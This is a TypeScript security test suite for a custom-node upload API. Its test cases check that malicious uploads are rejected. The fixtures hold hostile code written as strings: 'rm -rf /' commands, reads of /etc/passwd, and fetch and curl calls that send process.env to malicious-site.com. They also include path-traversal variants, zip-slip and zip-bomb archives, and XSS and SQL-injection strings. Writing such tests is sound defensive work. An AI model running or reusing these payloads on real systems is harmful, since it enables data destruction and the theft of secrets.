import { Container } from 'typedi';
import request from 'supertest';
import fs from 'fs/promises';
import path from 'path';
import { createHash } from 'crypto';
import archiver from 'archiver';

import { CustomNodesController } from '@/controllers/custom-nodes.controller';
import { CustomNodeValidationService } from '@/services/custom-node-validation.service';
import { CustomNodeStorageService } from '@/services/custom-node-storage.service';
import { setupTestDb, teardownTestDb } from '../integration/helpers/test-database';
import { createTestApp } from '../integration/helpers/test-app';
import { createMockUser, createTestUsers } from '../integration/helpers/test-user';
import type { User } from '@/databases/entities/User';

/**
 * Security tests for Custom Nodes system
 * Tests file upload validation, code injection prevention, and authorization
 */
describe('Custom Nodes Security Tests', () => {
	let app: any;
	let testUsers: { owner: User; admin: User; member: User };
	let controller: CustomNodesController;
	let validationService: CustomNodeValidationService;
	let storageService: CustomNodeStorageService;

	const maliciousTestCases = {
		// Code injection attempts
		maliciousJavaScript: `
			const { exec } = require('child_process');
			
			class MaliciousNode {
				description = {
					displayName: 'Malicious Node',
					name: 'maliciousNode',
				};
				
				async execute() {
					// Attempt command injection
					exec('rm -rf / --no-preserve-root', (error, stdout, stderr) => {
						console.log('System compromised!');
					});
					
					// Attempt to read sensitive files
					const fs = require('fs');
					const sensitiveData = fs.readFileSync('/etc/passwd', 'utf8');
					
					// Attempt network request to external server
					fetch('https://malicious-site.com/steal-data', {
						method: 'POST',
						body: JSON.stringify({ data: process.env }),
					});
					
					return [{ json: { message: 'Malicious payload executed' } }];
				}
			}
			module.exports = { nodeClass: MaliciousNode };
		`,

		// Path traversal attempts
		pathTraversalCode: `
			const fs = require('fs');
			const path = require('path');
			
			class PathTraversalNode {
				async execute() {
					// Attempt path traversal
					const maliciousPath = '../../../../../../../etc/passwd';
					try {
						const data = fs.readFileSync(path.resolve(maliciousPath), 'utf8');
						return [{ json: { stolenData: data } }];
					} catch (error) {
						// Try different variations
						const variations = [
							'..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
							'....//....//....//etc/passwd',
							'%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
						];
						
						for (const variant of variations) {
							try {
								const data = fs.readFileSync(variant, 'utf8');
								return [{ json: { data } }];
							} catch (e) {
								continue;
							}
						}
					}
					return [{ json: { message: 'Path traversal failed' } }];
				}
			}
			module.exports = { nodeClass: PathTraversalNode };
		`,

		// Prototype pollution attempt
		prototypePollution: `
			class PrototypePollutionNode {
				async execute() {
					// Attempt prototype pollution
					const maliciousInput = JSON.parse('{"__proto__":{"polluted":"yes"}}');
					Object.assign({}, maliciousInput);
					
					// Try constructor pollution
					const constructorPollution = JSON.parse('{"constructor":{"prototype":{"polluted":"yes"}}}');
					Object.assign({}, constructorPollution);
					
					return [{ json: { message: 'Prototype pollution attempted' } }];
				}
			}
			module.exports = { nodeClass: PrototypePollutionNode };
		`,

		// Process manipulation
		processManipulation: `
			class ProcessManipulationNode {
				async execute() {
					// Attempt to manipulate process
					process.exit(1);
					process.kill(process.pid);
					process.chdir('/tmp');
					
					// Try to access process environment
					const secrets = {
						env: process.env,
						argv: process.argv,
						cwd: process.cwd(),
					};
					
					// Attempt to spawn child processes
					const spawn = require('child_process').spawn;
					spawn('curl', ['https://malicious-site.com/exfiltrate', '-d', JSON.stringify(secrets)]);
					
					return [{ json: { secrets } }];
				}
			}
			module.exports = { nodeClass: ProcessManipulationNode };
		`,
	};

	beforeAll(async () => {
		await setupTestDb();
		testUsers = await createTestUsers();
		app = await createTestApp(testUsers.owner);

		controller = Container.get(CustomNodesController);
		validationService = Container.get(CustomNodeValidationService);
		storageService = Container.get(CustomNodeStorageService);
	});

	afterAll(async () => {
		await teardownTestDb();
	});

	describe('File Upload Security', () => {
		it('should reject files with dangerous extensions', async () => {
			const dangerousFiles = [
				{ name: 'malicious.exe', content: 'Binary executable content' },
				{ name: 'script.bat', content: '@echo off\nrmdir /s /q C:\\' },
				{ name: 'payload.sh', content: '#!/bin/bash\nrm -rf /' },
				{ name: 'virus.scr', content: 'Screensaver virus' },
				{ name: 'trojan.com', content: 'COM executable' },
				{ name: 'backdoor.pif', content: 'PIF file' },
			];

			for (const file of dangerousFiles) {
				const filePath = path.join(__dirname, 'fixtures', file.name);
				await fs.writeFile(filePath, file.content);

				try {
					await request(app)
						.post('/rest/custom-nodes')
						.attach('file', filePath)
						.field('name', 'Dangerous File Test')
						.field('author', 'Security Test')
						.expect(400);
				} finally {
					await fs.unlink(filePath);
				}
			}
		});

		it('should reject files exceeding size limits', async () => {
			// Create a file larger than 50MB
			const largeFilePath = path.join(__dirname, 'fixtures', 'large-file.zip');
			const largeContent = Buffer.alloc(51 * 1024 * 1024, 'A'); // 51MB

			await fs.writeFile(largeFilePath, largeContent);

			try {
				await request(app)
					.post('/rest/custom-nodes')
					.attach('file', largeFilePath)
					.field('name', 'Large File Test')
					.field('author', 'Security Test')
					.expect(413); // Payload Too Large
			} finally {
				await fs.unlink(largeFilePath);
			}
		});

		it('should validate ZIP file contents and structure', async () => {
			// Create malicious ZIP with path traversal
			const maliciousZipPath = path.join(__dirname, 'fixtures', 'malicious.zip');

			const output = fs.createWriteStream(maliciousZipPath);
			const archive = archiver('zip', { zlib: { level: 9 } });
			archive.pipe(output);

			// Add file with path traversal in name
			archive.append('malicious content', { name: '../../../evil.js' });
			archive.append('more malicious content', { name: '..\\..\\..\\windows\\evil.bat' });

			await archive.finalize();
			await new Promise((resolve) => output.on('close', resolve));

			try {
				await request(app)
					.post('/rest/custom-nodes')
					.attach('file', maliciousZipPath)
					.field('name', 'Malicious ZIP Test')
					.field('author', 'Security Test')
					.expect(400);
			} finally {
				await fs.unlink(maliciousZipPath);
			}
		});

		it('should reject archives with zip bombs', async () => {
			// Create a simple zip bomb (highly compressed file that expands enormously)
			const zipBombPath = path.join(__dirname, 'fixtures', 'zipbomb.zip');

			const output = fs.createWriteStream(zipBombPath);
			const archive = archiver('zip', {
				zlib: { level: 9 },
				store: false, // Force compression
			});
			archive.pipe(output);

			// Create highly repetitive content that compresses well but expands large
			const repetitiveContent = 'A'.repeat(1024 * 1024); // 1MB of 'A's
			for (let i = 0; i < 100; i++) {
				archive.append(repetitiveContent, { name: `file${i}.txt` });
			}

			await archive.finalize();
			await new Promise((resolve) => output.on('close', resolve));

			try {
				await request(app)
					.post('/rest/custom-nodes')
					.attach('file', zipBombPath)
					.field('name', 'Zip Bomb Test')
					.field('author', 'Security Test')
					.expect(400);
			} finally {
				await fs.unlink(zipBombPath);
			}
		});

		it('should validate file MIME types', async () => {
			// Create file with misleading extension but wrong MIME type
			const misleadingFile = path.join(__dirname, 'fixtures', 'fake.zip');
			await fs.writeFile(misleadingFile, 'This is actually a text file, not a ZIP');

			try {
				await request(app)
					.post('/rest/custom-nodes')
					.attach('file', misleadingFile)
					.field('name', 'Fake ZIP Test')
					.field('author', 'Security Test')
					.expect(400);
			} finally {
				await fs.unlink(misleadingFile);
			}
		});
	});

	describe('Code Injection Prevention', () => {
		it('should detect and reject malicious JavaScript code', async () => {
			const maliciousFilePath = path.join(__dirname, 'fixtures', 'malicious-node.js');
			await fs.writeFile(maliciousFilePath, maliciousTestCases.maliciousJavaScript);

			try {
				const uploadResponse = await request(app)
					.post('/rest/custom-nodes')
					.attach('file', maliciousFilePath)
					.field('name', 'Malicious Node Test')
					.field('author', 'Security Test')
					.field('autoValidate', 'true')
					.expect(201);

				const nodeId = uploadResponse.body.id;

				// Wait for validation to complete (should fail)
				let validationComplete = false;
				let attempts = 0;
				const maxAttempts = 10;

				while (!validationComplete && attempts < maxAttempts) {
					await new Promise((resolve) => setTimeout(resolve, 1000));

					const statusResponse = await request(app).get(`/rest/custom-nodes/${nodeId}`).expect(200);

					if (statusResponse.body.status === 'failed') {
						validationComplete = true;

						// Verify security violations were detected
						expect(statusResponse.body.validation_results.security_issues).toContain(
							expect.objectContaining({
								type: 'code_injection',
								severity: 'critical',
							}),
						);
					}
					attempts++;
				}

				expect(validationComplete).toBe(true);
			} finally {
				await fs.unlink(maliciousFilePath);
			}
		});

		it('should detect path traversal attempts', async () => {
			const pathTraversalFilePath = path.join(__dirname, 'fixtures', 'path-traversal.js');
			await fs.writeFile(pathTraversalFilePath, maliciousTestCases.pathTraversalCode);

			try {
				const uploadResponse = await request(app)
					.post('/rest/custom-nodes')
					.attach('file', pathTraversalFilePath)
					.field('name', 'Path Traversal Test')
					.field('author', 'Security Test')
					.field('autoValidate', 'true')
					.expect(201);

				const nodeId = uploadResponse.body.id;

				// Wait for validation
				await new Promise((resolve) => setTimeout(resolve, 2000));

				const statusResponse = await request(app).get(`/rest/custom-nodes/${nodeId}`).expect(200);

				expect(statusResponse.body.status).toBe('failed');
				expect(statusResponse.body.validation_results.security_issues).toContainEqual(
					expect.objectContaining({
						type: 'path_traversal',
						severity: 'high',
					}),
				);
			} finally {
				await fs.unlink(pathTraversalFilePath);
			}
		});

		it('should detect prototype pollution attempts', async () => {
			const pollutionFilePath = path.join(__dirname, 'fixtures', 'prototype-pollution.js');
			await fs.writeFile(pollutionFilePath, maliciousTestCases.prototypePollution);

			try {
				const uploadResponse = await request(app)
					.post('/rest/custom-nodes')
					.attach('file', pollutionFilePath)
					.field('name', 'Prototype Pollution Test')
					.field('author', 'Security Test')
					.field('autoValidate', 'true')
					.expect(201);

				const nodeId = uploadResponse.body.id;
				await new Promise((resolve) => setTimeout(resolve, 2000));

				const statusResponse = await request(app).get(`/rest/custom-nodes/${nodeId}`).expect(200);

				expect(statusResponse.body.status).toBe('failed');
				expect(statusResponse.body.validation_results.security_issues).toContainEqual(
					expect.objectContaining({
						type: 'prototype_pollution',
						severity: 'high',
					}),
				);
			} finally {
				await fs.unlink(pollutionFilePath);
			}
		});

		it('should detect dangerous process manipulation', async () => {
			const processFilePath = path.join(__dirname, 'fixtures', 'process-manipulation.js');
			await fs.writeFile(processFilePath, maliciousTestCases.processManipulation);

			try {
				const uploadResponse = await request(app)
					.post('/rest/custom-nodes')
					.attach('file', processFilePath)
					.field('name', 'Process Manipulation Test')
					.field('author', 'Security Test')
					.field('autoValidate', 'true')
					.expect(201);

				const nodeId = uploadResponse.body.id;
				await new Promise((resolve) => setTimeout(resolve, 2000));

				const statusResponse = await request(app).get(`/rest/custom-nodes/${nodeId}`).expect(200);

				expect(statusResponse.body.status).toBe('failed');
				expect(statusResponse.body.validation_results.security_issues).toContainEqual(
					expect.objectContaining({
						type: 'process_manipulation',
						severity: 'critical',
					}),
				);
			} finally {
				await fs.unlink(processFilePath);
			}
		});

		it('should prevent execution of invalid JavaScript syntax', async () => {
			const invalidSyntaxCode = `
				class InvalidNode {
					async execute() {
						// Intentional syntax errors
						const x = ;
						if (true { // Missing closing parenthesis
							console.log("Invalid syntax")
						}
						return [{ json: { message: "This should not execute" } }]
					}
				}
				module.exports = { nodeClass: InvalidNode };
			`;

			const syntaxErrorFilePath = path.join(__dirname, 'fixtures', 'syntax-error.js');
			await fs.writeFile(syntaxErrorFilePath, invalidSyntaxCode);

			try {
				const uploadResponse = await request(app)
					.post('/rest/custom-nodes')
					.attach('file', syntaxErrorFilePath)
					.field('name', 'Syntax Error Test')
					.field('author', 'Security Test')
					.field('autoValidate', 'true')
					.expect(201);

				const nodeId = uploadResponse.body.id;
				await new Promise((resolve) => setTimeout(resolve, 2000));

				const statusResponse = await request(app).get(`/rest/custom-nodes/${nodeId}`).expect(200);

				expect(statusResponse.body.status).toBe('failed');
				expect(statusResponse.body.validation_results.syntax_errors).toBeDefined();
				expect(statusResponse.body.validation_results.syntax_errors.length).toBeGreaterThan(0);
			} finally {
				await fs.unlink(syntaxErrorFilePath);
			}
		});
	});

	describe('Authorization and Access Control', () => {
		it('should enforce role-based access control for node operations', async () => {
			const validNodeCode = `
				class TestNode {
					description = { displayName: 'Test Node', name: 'testNode' };
					async execute() { return [{ json: { message: 'test' } }]; }
				}
				module.exports = { nodeClass: TestNode };
			`;

			const nodeFilePath = path.join(__dirname, 'fixtures', 'auth-test.js');
			await fs.writeFile(nodeFilePath, validNodeCode);

			try {
				// Upload as owner (should succeed)
				const ownerApp = await createTestApp(testUsers.owner);
				const ownerUpload = await request(ownerApp)
					.post('/rest/custom-nodes')
					.attach('file', nodeFilePath)
					.field('name', 'Owner Upload Test')
					.field('author', 'Owner')
					.expect(201);

				const nodeId = ownerUpload.body.id;

				// Try to access as member (should have limited access)
				const memberApp = await createTestApp(testUsers.member);

				// Member can read
				await request(memberApp).get(`/rest/custom-nodes/${nodeId}`).expect(200);

				// Member cannot delete
				await request(memberApp).delete(`/rest/custom-nodes/${nodeId}`).expect(403);

				// Admin can deploy
				const adminApp = await createTestApp(testUsers.admin);
				await request(adminApp).post(`/rest/custom-nodes/${nodeId}/validate`).expect(200);
			} finally {
				await fs.unlink(nodeFilePath);
			}
		});

		it('should prevent unauthorized access to system files', async () => {
			// Test that uploaded nodes cannot access system files outside their sandbox
			const systemAccessCode = `
				const fs = require('fs');
				class SystemAccessNode {
					async execute() {
						try {
							// Attempt to read system files
							const passwd = fs.readFileSync('/etc/passwd', 'utf8');
							const hosts = fs.readFileSync('/etc/hosts', 'utf8');
							return [{ json: { systemFiles: { passwd, hosts } } }];
						} catch (error) {
							return [{ json: { error: error.message } }];
						}
					}
				}
				module.exports = { nodeClass: SystemAccessNode };
			`;

			const systemAccessPath = path.join(__dirname, 'fixtures', 'system-access.js');
			await fs.writeFile(systemAccessPath, systemAccessCode);

			try {
				const uploadResponse = await request(app)
					.post('/rest/custom-nodes')
					.attach('file', systemAccessPath)
					.field('name', 'System Access Test')
					.field('author', 'Security Test')
					.field('autoValidate', 'true')
					.expect(201);

				const nodeId = uploadResponse.body.id;
				await new Promise((resolve) => setTimeout(resolve, 2000));

				// Validation should fail due to security issues
				const statusResponse = await request(app).get(`/rest/custom-nodes/${nodeId}`).expect(200);

				expect(statusResponse.body.status).toBe('failed');
				expect(statusResponse.body.validation_results.security_issues).toContainEqual(
					expect.objectContaining({
						type: 'file_system_access',
						severity: 'high',
					}),
				);
			} finally {
				await fs.unlink(systemAccessPath);
			}
		});

		it('should validate node permissions against user capabilities', async () => {
			// Test that users can only perform operations they have permissions for
			const nodeId = 'test-node-permissions';

			// Create a test node
			await request(app)
				.post('/rest/custom-nodes')
				.send({
					id: nodeId,
					name: 'Permission Test Node',
					status: 'validated',
				})
				.expect(201);

			// Test different user roles
			const testCases = [
				{
					user: testUsers.owner,
					action: 'deploy',
					expectedStatus: 200,
				},
				{
					user: testUsers.admin,
					action: 'deploy',
					expectedStatus: 200,
				},
				{
					user: testUsers.member,
					action: 'deploy',
					expectedStatus: 403,
				},
				{
					user: testUsers.member,
					action: 'delete',
					expectedStatus: 403,
				},
			];

			for (const testCase of testCases) {
				const userApp = await createTestApp(testCase.user);

				if (testCase.action === 'deploy') {
					await request(userApp)
						.post(`/rest/custom-nodes/${nodeId}/deploy`)
						.send({ environment: 'development' })
						.expect(testCase.expectedStatus);
				} else if (testCase.action === 'delete') {
					await request(userApp)
						.delete(`/rest/custom-nodes/${nodeId}`)
						.expect(testCase.expectedStatus);
				}
			}
		});

		it('should prevent session hijacking and CSRF attacks', async () => {
			// Test CSRF protection
			await request(app)
				.post('/rest/custom-nodes')
				.set('Origin', 'https://malicious-site.com')
				.field('name', 'CSRF Test')
				.field('author', 'Attacker')
				.expect(403); // Should be blocked by CORS/CSRF protection

			// Test that sessions are properly validated
			await request(app)
				.get('/rest/custom-nodes')
				.set('Authorization', 'Bearer invalid-token')
				.expect(401);
		});
	});

	describe('Input Validation and Sanitization', () => {
		it('should sanitize user input to prevent XSS', async () => {
			const xssAttempts = [
				'<script>alert("xss")</script>',
				'javascript:alert("xss")',
				'"><script>alert("xss")</script>',
				"' OR '1'='1",
				'${7*7}', // Template injection
				'#{7*7}', // Expression injection
			];

			for (const maliciousInput of xssAttempts) {
				await request(app)
					.post('/rest/custom-nodes')
					.field('name', maliciousInput)
					.field('description', maliciousInput)
					.field('author', maliciousInput)
					.attach('file', Buffer.from('valid content'), 'test.js')
					.expect(400); // Should reject malicious input
			}
		});

		it('should validate and sanitize file metadata', async () => {
			const validCode = 'class TestNode { async execute() { return []; } }';
			const filePath = path.join(__dirname, 'fixtures', 'metadata-test.js');
			await fs.writeFile(filePath, validCode);

			try {
				// Test with extremely long metadata
				const longString = 'A'.repeat(10000);

				await request(app)
					.post('/rest/custom-nodes')
					.attach('file', filePath)
					.field('name', longString)
					.field('description', longString)
					.field('author', 'Test')
					.expect(400); // Should reject due to length limits

				// Test with invalid JSON in tags
				await request(app)
					.post('/rest/custom-nodes')
					.attach('file', filePath)
					.field('name', 'Valid Name')
					.field('author', 'Test')
					.field('tags', 'invalid-json-string')
					.expect(400);
			} finally {
				await fs.unlink(filePath);
			}
		});

		it('should prevent SQL injection in search queries', async () => {
			const sqlInjectionAttempts = [
				"'; DROP TABLE custom_nodes; --",
				"' UNION SELECT * FROM users --",
				"1' OR '1'='1",
				"admin'--",
				"' OR 1=1#",
			];

			for (const injection of sqlInjectionAttempts) {
				const searchResponse = await request(app)
					.get('/rest/custom-nodes')
					.query({ search: injection })
					.expect(200);

				// Should return normal results, not cause database errors
				expect(searchResponse.body).toHaveProperty('nodes');
				expect(Array.isArray(searchResponse.body.nodes)).toBe(true);
			}
		});
	});

	describe('Resource Protection', () => {
		it('should prevent DoS attacks through resource exhaustion', async () => {
			// Test rate limiting
			const requests = Array.from({ length: 100 }, () => request(app).get('/rest/custom-nodes'));

			const responses = await Promise.allSettled(requests);
			const rateLimited = responses.filter(
				(result) => result.status === 'fulfilled' && result.value.status === 429,
			);

			expect(rateLimited.length).toBeGreaterThan(0);
		});

		it('should enforce memory limits during validation', async () => {
			// Create a node that would consume excessive memory
			const memoryExhaustionCode = `
				class MemoryExhaustionNode {
					async execute() {
						// Try to allocate large amount of memory
						const arrays = [];
						for (let i = 0; i < 1000000; i++) {
							arrays.push(new Array(1000000).fill('memory-hog'));
						}
						return [{ json: { message: 'Memory exhausted' } }];
					}
				}
				module.exports = { nodeClass: MemoryExhaustionNode };
			`;

			const memoryTestPath = path.join(__dirname, 'fixtures', 'memory-test.js');
			await fs.writeFile(memoryTestPath, memoryExhaustionCode);

			try {
				const uploadResponse = await request(app)
					.post('/rest/custom-nodes')
					.attach('file', memoryTestPath)
					.field('name', 'Memory Test Node')
					.field('author', 'Security Test')
					.field('autoValidate', 'true')
					.expect(201);

				const nodeId = uploadResponse.body.id;
				await new Promise((resolve) => setTimeout(resolve, 3000));

				const statusResponse = await request(app).get(`/rest/custom-nodes/${nodeId}`).expect(200);

				// Should fail validation due to resource limits
				expect(statusResponse.body.status).toBe('failed');
				expect(statusResponse.body.validation_results.errors).toContainEqual(
					expect.stringMatching(/memory|resource|limit/i),
				);
			} finally {
				await fs.unlink(memoryTestPath);
			}
		});

		it('should enforce time limits during validation', async () => {
			// Create a node with infinite loop
			const infiniteLoopCode = `
				class InfiniteLoopNode {
					async execute() {
						while (true) {
							// Infinite loop to test timeout
							console.log('Running forever...');
							await new Promise(resolve => setTimeout(resolve, 100));
						}
						return [{ json: { message: 'This should never be reached' } }];
					}
				}
				module.exports = { nodeClass: InfiniteLoopNode };
			`;

			const loopTestPath = path.join(__dirname, 'fixtures', 'infinite-loop.js');
			await fs.writeFile(loopTestPath, infiniteLoopCode);

			try {
				const uploadResponse = await request(app)
					.post('/rest/custom-nodes')
					.attach('file', loopTestPath)
					.field('name', 'Infinite Loop Test')
					.field('author', 'Security Test')
					.field('autoValidate', 'true')
					.expect(201);

				const nodeId = uploadResponse.body.id;
				await new Promise((resolve) => setTimeout(resolve, 5000)); // Wait longer than validation timeout

				const statusResponse = await request(app).get(`/rest/custom-nodes/${nodeId}`).expect(200);

				expect(statusResponse.body.status).toBe('failed');
				expect(statusResponse.body.validation_results.errors).toContainEqual(
					expect.stringMatching(/timeout|time.*limit/i),
				);
			} finally {
				await fs.unlink(loopTestPath);
			}
		});
	});
});
